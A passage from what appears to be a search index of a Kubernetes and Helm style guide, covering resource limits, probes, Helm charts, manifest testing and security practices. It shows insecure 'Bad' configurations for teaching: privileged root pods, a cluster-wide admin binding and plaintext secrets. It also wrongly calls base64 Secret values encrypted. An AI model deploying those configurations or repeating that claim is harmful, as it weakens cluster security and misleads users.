remoteRef:\n        key: production/database\n        property: password\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#resource-limits-and-requests","title":"Resource Limits and Requests","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#guidelines","title":"Guidelines","text":"<pre><code>## Development\nresources:\n  requests:\n    cpu: 50m       # 0.05 CPU cores\n    memory: 64Mi\n  limits:\n    cpu: 200m      # 0.2 CPU cores\n    memory: 256Mi\n\n## Staging\nresources:\n  requests:\n    cpu: 100m      # 0.1 CPU cores\n    memory: 128Mi\n  limits:\n    cpu: 500m      # 0.5 CPU cores\n    memory: 512Mi\n\n## Production\nresources:\n  requests:\n    cpu: 250m      # 0.25 CPU cores\n    memory: 512Mi\n  limits:\n    cpu: 1000m     # 1 CPU core\n    memory: 2Gi\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#quality-of-service-qos-classes","title":"Quality of Service (QoS) Classes","text":"<pre><code>## Guaranteed QoS - requests == limits\nresources:\n  requests:\n    cpu: 500m\n    memory: 1Gi\n  limits:\n    cpu: 500m\n    memory: 1Gi\n\n## Burstable QoS - requests &lt; limits\nresources:\n  requests:\n    cpu: 100m\n    memory: 256Mi\n  limits:\n    cpu: 500m\n    memory: 1Gi\n\n## BestEffort QoS - no requests or limits (avoid in production)\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#health-probes","title":"Health Probes","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#liveness-probe","title":"Liveness Probe","text":"<p>Restarts container if probe fails:</p> <pre><code>livenessProbe:\n  httpGet:\n    path: /health\n    port: 8080\n    httpHeaders:\n      - name: X-Health-Check\n        value: liveness\n  initialDelaySeconds: 30\n  periodSeconds: 10\n  timeoutSeconds: 5\n  successThreshold: 1\n  failureThreshold: 3\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#readiness-probe","title":"Readiness Probe","text":"<p>Removes pod from service endpoints if probe fails:</p> <pre><code>readinessProbe:\n  httpGet:\n    path: /ready\n    port: 8080\n  initialDelaySeconds: 10\n  periodSeconds: 5\n  timeoutSeconds: 3\n  successThreshold: 1\n  failureThreshold: 3\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#startup-probe","title":"Startup Probe","text":"<p>Delays liveness/readiness probes during slow application startup:</p> <pre><code>startupProbe:\n  httpGet:\n    path: /startup\n    port: 8080\n  initialDelaySeconds: 0\n  periodSeconds: 5\n  timeoutSeconds: 3\n  successThreshold: 1\n  failureThreshold: 30  # 30 * 5s = 150s max startup time\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#probe-types","title":"Probe Types","text":"<pre><code>## HTTP probe\nhttpGet:\n  path: /health\n  port: 8080\n  scheme: HTTP\n\n## TCP probe\ntcpSocket:\n  port: 5432\n\n## Command probe\nexec:\n  command:\n    - /bin/sh\n    - -c\n    - pg_isready -U postgres\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#helm-chart-structure","title":"Helm Chart Structure","text":"<pre><code>my-application/\n\u251c\u2500\u2500 Chart.yaml              # Chart metadata\n\u251c\u2500\u2500 values.yaml             # Default configuration values\n\u251c\u2500\u2500 values-dev.yaml         # Development overrides\n\u251c\u2500\u2500 values-prod.yaml        # Production overrides\n\u251c\u2500\u2500 charts/                 # Dependency charts\n\u251c\u2500\u2500 templates/\n\u2502   \u251c\u2500\u2500 _helpers.tpl        # Template helpers\n\u2502   \u251c\u2500\u2500 deployment.yaml     # Deployment manifest\n\u2502   \u251c\u2500\u2500 service.yaml        # Service manifest\n\u2502   \u251c\u2500\u2500 ingress.yaml        # Ingress manifest\n\u2502   \u251c\u2500\u2500 configmap.yaml      # ConfigMap\n\u2502   \u251c\u2500\u2500 secret.yaml         # Secret\n\u2502   \u251c\u2500\u2500 serviceaccount.yaml # ServiceAccount\n\u2502   \u251c\u2500\u2500 hpa.yaml            # HorizontalPodAutoscaler\n\u2502   \u251c\u2500\u2500 pdb.yaml            # PodDisruptionBudget\n\u2502   \u2514\u2500\u2500 NOTES.txt           # Post-install notes\n\u251c\u2500\u2500 .helmignore             # Files to exclude\n\u2514\u2500\u2500 README.md               # Chart documentation\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#chartyaml","title":"Chart.yaml","text":"<pre><code>apiVersion: v2\nname: web-application\ndescription: A Helm chart for web application deployment\ntype: application\nversion: 1.0.0\nappVersion: \"1.2.3\"\nkeywords:\n  - web\n  - api\n  - application\nhome: https://example.com\nsources:\n  - https://github.com/example/web-application\nmaintainers:\n  - name: Tyler Dukes\n    email: tyler@example.com\ndependencies:\n  - name: postgresql\n    version: \"12.x.x\"\n    repository: \"https://charts.bitnami.com/bitnami\"\n    condition: postgresql.enabled\n  - name: redis\n    version: \"17.x.x\"\n    repository: \"https://charts.bitnami.com/bitnami\"\n    condition: redis.enabled\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#valuesyaml-patterns","title":"values.yaml Patterns","text":"<pre><code>## values.yaml\n---\n## Application configuration\nreplicaCount: 3\n\nimage:\n  repository: myregistry.com/web-application\n  pullPolicy: IfNotPresent\n  tag: \"\"  # Defaults to Chart.appVersion\n\nimagePullSecrets: []\nnameOverride: \"\"\nfullnameOverride: \"\"\n\nserviceAccount:\n  create: true\n  annotations: {}\n  name: \"\"\n\npodAnnotations:\n  prometheus.io/scrape: \"true\"\n  prometheus.io/port: \"8080\"\n\npodSecurityContext:\n  runAsNonRoot: true\n  runAsUser: 1000\n  fsGroup: 1000\n\nsecurityContext:\n  allowPrivilegeEscalation: false\n  capabilities:\n    drop:\n      - ALL\n  readOnlyRootFilesystem: true\n\nservice:\n  type: ClusterIP\n  port: 80\n  targetPort: http\n\ningress:\n  enabled: true\n  className: nginx\n  annotations:\n    cert-manager.io/cluster-issuer: letsencrypt-prod\n  hosts:\n    - host: app.example.com\n      paths:\n        - path: /\n          pathType: Prefix\n  tls:\n    - secretName: app-tls\n      hosts:\n        - app.example.com\n\nresources:\n  requests:\n    cpu: 100m\n    memory: 128Mi\n  limits:\n    cpu: 500m\n    memory: 512Mi\n\nautoscaling:\n  enabled: true\n  minReplicas: 3\n  maxReplicas: 10\n  targetCPUUtilizationPercentage: 80\n  targetMemoryUtilizationPercentage: 80\n\nnodeSelector: {}\ntolerations: []\naffinity: {}\n\n## Application-specific configuration\nconfig:\n  environment: production\n  logLevel: info\n  database:\n    host: postgres.production.svc.cluster.local\n    port: 5432\n\n## Secret management\nsecrets:\n  databasePassword: \"\"\n  apiKey: \"\"\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#helper-templates-_helperstpl","title":"Helper Templates (_helpers.tpl)","text":"<pre><code>{{/*\nExpand the name of the chart.\n*/}}\n{{- define \"web-application.name\" -}}\n{{- default .Chart.Name .Values.nameOverride | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n\n{{/*\nCreate a default fully qualified app name.\n*/}}\n{{- define \"web-application.fullname\" -}}\n{{- if .Values.fullnameOverride }}\n{{- .Values.fullnameOverride | trunc 63 | trimSuffix \"-\" }}\n{{- else }}\n{{- $name := default .Chart.Name .Values.nameOverride }}\n{{- if contains $name .Release.Name }}\n{{- .Release.Name | trunc 63 | trimSuffix \"-\" }}\n{{- else }}\n{{- printf \"%s-%s\" .Release.Name $name | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n{{- end }}\n{{- end }}\n\n{{/*\nCreate chart name and version as used by the chart label.\n*/}}\n{{- define \"web-application.chart\" -}}\n{{- printf \"%s-%s\" .Chart.Name .Chart.Version | replace \"+\" \"_\" | trunc 63 | trimSuffix \"-\" }}\n{{- end }}\n\n{{/*\nCommon labels\n*/}}\n{{- define \"web-application.labels\" -}}\nhelm.sh/chart: {{ include \"web-application.chart\" . }}\n{{ include \"web-application.selectorLabels\" . }}\n{{- if .Chart.AppVersion }}\napp.kubernetes.io/version: {{ .Chart.AppVersion | quote }}\n{{- end }}\napp.kubernetes.io/managed-by: {{ .Release.Service }}\n{{- end }}\n\n{{/*\nSelector labels\n*/}}\n{{- define \"web-application.selectorLabels\" -}}\napp.kubernetes.io/name: {{ include \"web-application.name\" . }}\napp.kubernetes.io/instance: {{ .Release.Name }}\n{{- end }}\n\n{{/*\nCreate the name of the service account to use\n*/}}\n{{- define \"web-application.serviceAccountName\" -}}\n{{- if .Values.serviceAccount.create }}\n{{- default (include \"web-application.fullname\" .) .Values.serviceAccount.name }}\n{{- else }}\n{{- default \"default\" .Values.serviceAccount.name }}\n{{- end }}\n{{- end }}\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#helm-template-example","title":"Helm Template Example","text":"<pre><code>## templates/deployment.yaml\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ include \"web-application.fullname\" . }}\n  labels:\n    {{- include \"web-application.labels\" . | nindent 4 }}\nspec:\n  {{- if not .Values.autoscaling.enabled }}\n  replicas: {{ .Values.replicaCount }}\n  {{- end }}\n  selector:\n    matchLabels:\n      {{- include \"web-application.selectorLabels\" . | nindent 6 }}\n  template:\n    metadata:\n      annotations:\n        checksum/config: {{ include (print $.Template.BasePath \"/configmap.yaml\") . | sha256sum }}\n        {{- with .Values.podAnnotations }}\n        {{- toYaml . | nindent 8 }}\n        {{- end }}\n      labels:\n        {{- include \"web-application.selectorLabels\" . | nindent 8 }}\n    spec:\n      {{- with .Values.imagePullSecrets }}\n      imagePullSecrets:\n        {{- toYaml . | nindent 8 }}\n      {{- end }}\n      serviceAccountName: {{ include \"web-application.serviceAccountName\" . }}\n      securityContext:\n        {{- toYaml .Values.podSecurityContext | nindent 8 }}\n      containers:\n        - name: {{ .Chart.Name }}\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion }}\"\n          imagePullPolicy: {{ .Values.image.pullPolicy }}\n          ports:\n            - name: http\n              containerPort: 8080\n              protocol: TCP\n          env:\n            - name: APP_ENV\n              value: {{ .Values.config.environment }}\n            - name: LOG_LEVEL\n              value: {{ .Values.config.logLevel }}\n          resources:\n            {{- toYaml .Values.resources | nindent 12 }}\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#helm-commands","title":"Helm Commands","text":"<pre><code>## Install chart\nhelm install my-app ./my-application -n production\n\n## Install with custom values\nhelm install my-app ./my-application \\\n  -f values-prod.yaml \\\n  -n production \\\n  --create-namespace\n\n## Upgrade release\nhelm upgrade my-app ./my-application \\\n  -f values-prod.yaml \\\n  -n production\n\n## Upgrade with rollback on failure\nhelm upgrade my-app ./my-application \\\n  -f values-prod.yaml \\\n  --atomic \\\n  --timeout 5m\n\n## Dry run / template rendering\nhelm install my-app ./my-application \\\n  --dry-run \\\n  --debug \\\n  -f values-prod.yaml\n\n## Lint chart\nhelm lint ./my-application\n\n## Package chart\nhelm package ./my-application\n\n## List releases\nhelm list -n production\n\n## Rollback\nhelm rollback my-app 5 -n production\n\n## Uninstall\nhelm uninstall my-app -n production\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#testing","title":"Testing","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#testing-with-kubeval","title":"Testing with kubeval","text":"<p>Validate Kubernetes YAML manifests:</p> <pre><code>## Install kubeval\nbrew install kubeval\n\n## Validate manifest\nkubeval deployment.yaml\n\n## Validate multiple files\nkubeval manifests/*.yaml\n\n## Validate against specific Kubernetes version\nkubeval --kubernetes-version 1.28.0 deployment.yaml\n\n## Strict mode (fail on warnings)\nkubeval --strict deployment.yaml\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#testing-with-kubeconform","title":"Testing with kubeconform","text":"<p>More comprehensive validation:</p> <pre><code>## Install kubeconform\nbrew install kubeconform\n\n## Validate manifests\nkubeconform manifests/\n\n## Validate with CRDs\nkubeconform -schema-location default \\\n  -schema-location 'crds/{{.ResourceKind}}.json' \\\n  manifests/\n\n## Output in JSON\nkubeconform -output json manifests/\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#testing-with-kube-score","title":"Testing with kube-score","text":"<p>Analyze manifests for best practices:</p> <pre><code>## Install kube-score\nbrew install kube-score\n\n## Analyze deployment\nkube-score score deployment.yaml\n\n## Check all manifests\nkube-score score manifests/*.yaml\n\n## Ignore specific checks\nkube-score score --ignore-test pod-networkpolicy deployment.yaml\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#unit-testing-with-conftest","title":"Unit Testing with conftest","text":"<p>Policy-based testing for Kubernetes:</p> <pre><code>## Install conftest\nbrew install conftest\n\n## Test Kubernetes manifests\nconftest test deployment.yaml\n\n## Custom policy\nconftest test -p policy/ deployment.yaml\n</code></pre> <p>Example policy:</p> <pre><code>## policy/kubernetes.rego\npackage main\n\ndeny[msg] {\n  input.kind == \"Deployment\"\n  not input.spec.template.spec.securityContext.runAsNonRoot\n  msg := \"Containers must not run as root\"\n}\n\ndeny[msg] {\n  input.kind == \"Deployment\"\n  container := input.spec.template.spec.containers[_]\n  not container.resources.limits\n  msg := sprintf(\"Container %s must have resource limits\", [container.name])\n}\n\nwarn[msg] {\n  input.kind == \"Service\"\n  input.spec.type == \"LoadBalancer\"\n  msg := \"Consider using Ingress instead of LoadBalancer\"\n}\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#integration-testing-with-kind","title":"Integration Testing with kind","text":"<p>Test on local Kubernetes cluster:</p> <pre><code>## Create kind cluster\nkind create cluster --name test-cluster\n\n## Apply manifests\nkubectl apply -f manifests/\n\n## Run tests\nkubectl wait --for=condition=available --timeout=60s \\\n  deployment/myapp\n\n## Test service endpoints\nkubectl run test-pod --image=curlimages/curl --rm -it -- \\\n  curl http://myapp-service:80/health\n\n## Cleanup\nkind delete cluster --name test-cluster\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#e2e-testing-script","title":"E2E Testing Script","text":"<pre><code>## tests/e2e-test.sh\n#!/bin/bash\nset -e\n\n# Create kind cluster\necho \"Creating test cluster...\"\nkind create cluster --name e2e-test --wait 60s\n\n# Apply manifests\necho \"Applying manifests...\"\nkubectl apply -f manifests/\n\n# Wait for deployment\necho \"Waiting for deployment...\"\nkubectl wait --for=condition=available --timeout=300s \\\n  deployment/myapp -n default\n\n# Test application\necho \"Testing application...\"\nkubectl port-forward svc/myapp-service 8080:80 &amp;\nPF_PID=$!\nsleep 5\n\nresponse=$(curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8080/health)\nif [ \"$response\" != \"200\" ]; then\n  echo \"Health check failed: $response\"\n  kill $PF_PID\n  kind delete cluster --name e2e-test\n  exit 1\nfi\n\necho \"Tests passed!\"\nkill $PF_PID\nkind delete cluster --name e2e-test\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#testing-with-helm","title":"Testing with Helm","text":"<p>Test Helm charts:</p> <pre><code>## Lint Helm chart\nhelm lint ./mychart\n\n## Dry run install\nhelm install myapp ./mychart --dry-run --debug\n\n## Template and validate\nhelm template myapp ./mychart | kubeval -\n\n## Test with specific values\nhelm install myapp ./mychart --dry-run \\\n  --values test-values.yaml\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#chart-testing","title":"Chart Testing","text":"<pre><code>## ct.yaml (Chart Testing config)\nchart-dirs:\n  - charts\nchart-repos:\n  - bitnami=https://charts.bitnami.com/bitnami\nhelm-extra-args: --timeout 600s\n</code></pre> <pre><code>## Install ct\nbrew install chart-testing\n\n## Lint charts\nct lint --config ct.yaml\n\n## Test charts in kind\nct install --config ct.yaml\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#cicd-integration","title":"CI/CD Integration","text":"<pre><code>## .github/workflows/k8s-test.yml\nname: Kubernetes Tests\n\non: [push, pull_request]\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install tools\n        run: |\n          curl -L https://github.com/kubeval/kubeval/releases/latest/download/kubeval-linux-amd64.tar.gz | tar xz\n          sudo mv kubeval /usr/local/bin\n\n      - name: Validate manifests\n        run: kubeval manifests/*.yaml\n\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Create kind cluster\n        uses: helm/kind-action@v1\n\n      - name: Deploy and test\n        run: |\n          kubectl apply -f manifests/\n          kubectl wait --for=condition=available --timeout=60s deployment/myapp\n          kubectl get pods\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#testing-rbac","title":"Testing RBAC","text":"<p>Test Role-Based Access Control:</p> <pre><code>## Test if service account can perform action\nkubectl auth can-i create pods \\\n  --as=system:serviceaccount:default:myapp\n\n## Test with specific permissions\nkubectl auth can-i delete deployments \\\n  --as=system:serviceaccount:default:myapp \\\n  -n production\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#resource-quota-testing","title":"Resource Quota Testing","text":"<pre><code>## Apply resource quota\nkubectl apply -f resourcequota.yaml\n\n## Try to create pod that exceeds quota\nkubectl apply -f test-pod.yaml\n\n## Verify quota enforcement\nkubectl describe resourcequota -n test-namespace\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#network-policy-testing","title":"Network Policy Testing","text":"<p>Test network isolation:</p> <pre><code>## Apply network policy\nkubectl apply -f networkpolicy.yaml\n\n## Test connectivity (should fail)\nkubectl run test-pod --image=curlimages/curl --rm -it -- \\\n  curl --max-time 5 http://restricted-service\n\n## Test from allowed pod (should succeed)\nkubectl run allowed-pod -l app=allowed --image=curlimages/curl --rm -it -- \\\n  curl http://restricted-service\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#performance-testing","title":"Performance Testing","text":"<pre><code>## Load test with k6\ncat &lt;&lt;EOF | k6 run -\nimport http from 'k6/http';\nimport { check } from 'k6';\n\nexport let options = {\n  vus: 10,\n  duration: '30s',\n};\n\nexport default function() {\n  let res = http.get('http://myapp-service');\n  check(res, {\n    'status is 200': (r) =&gt; r.status === 200,\n  });\n}\nEOF\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#snapshot-testing","title":"Snapshot Testing","text":"<p>Test manifest rendering:</p> <pre><code>## Generate manifests\nkustomize build overlays/production &gt; snapshot.yaml\n\n## Compare with previous snapshot\ndiff snapshot-previous.yaml snapshot.yaml\n\n## Update snapshot if changes are expected\ncp snapshot.yaml snapshot-previous.yaml\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#anti-patterns","title":"Anti-Patterns","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-latest-tag","title":"\u274c Avoid: latest Tag","text":"<pre><code>## Bad - Unpredictable deployments\nimage: nginx:latest\n\n## Good - Pin specific versions\nimage: nginx:1.24.0\nimage: nginx:1.24.0-alpine\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-no-resource-limits","title":"\u274c Avoid: No Resource Limits","text":"<pre><code>## Bad - Can cause node resource exhaustion\ncontainers:\n  - name: app\n    image: myapp:1.0.0\n\n## Good - Define limits\ncontainers:\n  - name: app\n    image: myapp:1.0.0\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 512Mi\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-running-as-root","title":"\u274c Avoid: Running as Root","text":"<pre><code>## Bad - Security risk\nsecurityContext:\n  runAsUser: 0\n\n## Good - Run as non-root\nsecurityContext:\n  runAsNonRoot: true\n  runAsUser: 1000\n  fsGroup: 1000\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-missing-health-probes","title":"\u274c Avoid: Missing Health Probes","text":"<pre><code>## Bad - No health checks\ncontainers:\n  - name: app\n    image: myapp:1.0.0\n\n## Good - Include probes\ncontainers:\n  - name: app\n    image: myapp:1.0.0\n    livenessProbe:\n      httpGet:\n        path: /health\n        port: 8080\n    readinessProbe:\n      httpGet:\n        path: /ready\n        port: 8080\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-storing-secrets-in-configmaps","title":"\u274c Avoid: Storing Secrets in ConfigMaps","text":"<pre><code>## Bad - Secrets in ConfigMap (visible in plain text)\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app-config\ndata:\n  database_password: \"MySecretPassword\"  # \u274c Plain text!\n  api_key: \"sk-1234567890\"              # \u274c Plain text!\n\n## Good - Use Secrets with proper encryption\napiVersion: v1\nkind: Secret\nmetadata:\n  name: app-secrets\ntype: Opaque\nstringData:\n  database_password: \"MySecretPassword\"  # \u2705 Base64 encoded\n  api_key: \"sk-1234567890\"              # \u2705 Base64 encoded\n\n## Better - Use external secret management\n## Sealed Secrets, External Secrets Operator, or cloud provider KMS\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-no-pod-disruption-budgets","title":"\u274c Avoid: No Pod Disruption Budgets","text":"<pre><code>## Bad - No protection during cluster maintenance\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  # No PodDisruptionBudget - all pods could be terminated at once\n\n## Good - Define disruption budget\napiVersion: policy/v1\nkind: PodDisruptionBudget\nmetadata:\n  name: web-pdb\nspec:\n  minAvailable: 2  # \u2705 Always keep 2 pods running\n  selector:\n    matchLabels:\n      app: web\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#avoid-missing-network-policies","title":"\u274c Avoid: Missing Network Policies","text":"<pre><code>## Bad - No network restrictions (pods can talk to anything)\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\nspec:\n  # No NetworkPolicy - unrestricted network access\n\n## Good - Restrict network traffic\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: backend-netpol\nspec:\n  podSelector:\n    matchLabels:\n      app: backend\n  policyTypes:\n    - Ingress\n    - Egress\n  ingress:\n    - from:\n        - podSelector:\n            matchLabels:\n              app: frontend\n      ports:\n        - protocol: TCP\n          port: 8080\n  egress:\n    - to:\n        - podSelector:\n            matchLabels:\n              app: database\n      ports:\n        - protocol: TCP\n          port: 5432\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#security-best-practices","title":"Security Best Practices","text":"","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#pod-security-standards","title":"Pod Security Standards","text":"<p>Use Pod Security Standards to enforce security policies.</p> <pre><code>## Bad - Running as root with privileges\napiVersion: v1\nkind: Pod\nmetadata:\n  name: insecure-pod\nspec:\n  containers:\n  - name: app\n    image: myapp:latest\n    securityContext:\n      privileged: true  # NEVER in production!\n      runAsUser: 0      # Running as root!\n\n## Good - Non-root with security contexts\napiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-pod\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n    fsGroup: 2000\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: app\n    image: myapp:latest\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      capabilities:\n        drop:\n        - ALL\n    volumeMounts:\n    - name: tmp\n      mountPath: /tmp\n  volumes:\n  - name: tmp\n    emptyDir: {}\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#secrets-management","title":"Secrets Management","text":"<p>Never hardcode sensitive data in manifests.</p> <pre><code>## Bad - Secrets in plain text\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  containers:\n  - name: app\n    env:\n    - name: DB_PASSWORD\n      value: \"SuperSecret123\"  # EXPOSED!\n    - name: API_KEY\n      value: \"sk_live_abc123\"   # In version control!\n\n## Good - Use Kubernetes Secrets\napiVersion: v1\nkind: Secret\nmetadata:\n  name: app-secrets\ntype: Opaque\ndata:\n  db-password: U3VwZXJTZWNyZXQxMjM=  # base64 encoded\n  api-key: c2tfbGl2ZV9hYmMxMjM=      # base64 encoded\n\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  containers:\n  - name: app\n    envFrom:\n    - secretRef:\n        name: app-secrets\n\n## Better - Use external secrets management\n## External Secrets Operator with AWS Secrets Manager\napiVersion: external-secrets.io/v1beta1\nkind: ExternalSecret\nmetadata:\n  name: app-secrets\nspec:\n  refreshInterval: 1h\n  secretStoreRef:\n    name: aws-secrets-manager\n    kind: SecretStore\n  target:\n    name: app-secrets\n  data:\n  - secretKey: db-password\n    remoteRef:\n      key: prod/db/password\n  - secretKey: api-key\n    remoteRef:\n      key: prod/api/key\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#network-policies","title":"Network Policies","text":"<p>Restrict pod-to-pod communication.</p> <pre><code>## Bad - No network policies (pods can access anything)\n## Default allow-all is insecure!\n\n## Good - Deny all, then allow specific traffic\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-app-to-db\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: web-app\n  policyTypes:\n  - Egress\n  egress:\n  - to:\n    - podSelector:\n        matchLabels:\n          app: postgresql\n    ports:\n    - protocol: TCP\n      port: 5432\n  - to:  # Allow DNS\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#rbac-role-based-access-control","title":"RBAC (Role-Based Access Control)","text":"<p>Follow principle of least privilege.</p> <pre><code>## Bad - Cluster-admin for all service accounts\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: all-cluster-admin\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin  # TOO PERMISSIVE!\nsubjects:\n- kind: ServiceAccount\n  name: default\n  namespace: default\n\n## Good - Scoped permissions\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: app-sa\n  namespace: production\n\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: app-role\n  namespace: production\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\", \"configmaps\"]\n  verbs: [\"get\", \"list\"]\n- apiGroups: [\"\"]\n  resources: [\"secrets\"]\n  resourceNames: [\"app-secrets\"]  # Specific secret only\n  verbs: [\"get\"]\n\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: app-role-binding\n  namespace: production\nsubjects:\n- kind: ServiceAccount\n  name: app-sa\n  namespace: production\nroleRef:\n  kind: Role\n  name: app-role\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#resource-limits-and-quotas","title":"Resource Limits and Quotas","text":"<p>Prevent resource exhaustion attacks.</p> <pre><code>## Bad - No resource limits\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  containers:\n  - name: app\n    image: myapp\n    ## No limits - can consume all node resources!\n\n## Good - Set resource requests and limits\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n  containers:\n  - name: app\n    image: myapp\n    resources:\n      requests:\n        memory: \"128Mi\"\n        cpu: \"100m\"\n      limits:\n        memory: \"256Mi\"\n        cpu: \"200m\"\n\n## Good - Enforce with ResourceQuota\napiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: production-quota\n  namespace: production\nspec:\n  hard:\n    requests.cpu: \"10\"\n    requests.memory: 20Gi\n    limits.cpu: \"20\"\n    limits.memory: 40Gi\n    persistentvolumeclaims: \"10\"\n\n## Good - Set default limits\napiVersion: v1\nkind: LimitRange\nmetadata:\n  name: default-limits\n  namespace: production\nspec:\n  limits:\n  - default:\n      memory: 512Mi\n      cpu: 500m\n    defaultRequest:\n      memory: 256Mi\n      cpu: 250m\n    type: Container\n</code></pre>","tags":["kubernetes","helm","containers","orchestration","k8s"]},{"location":"02_language_guides/kubernetes/#image-security","title":"Image Security","text":"<p>Use trusted images and scan for vulnerabilities.</p> 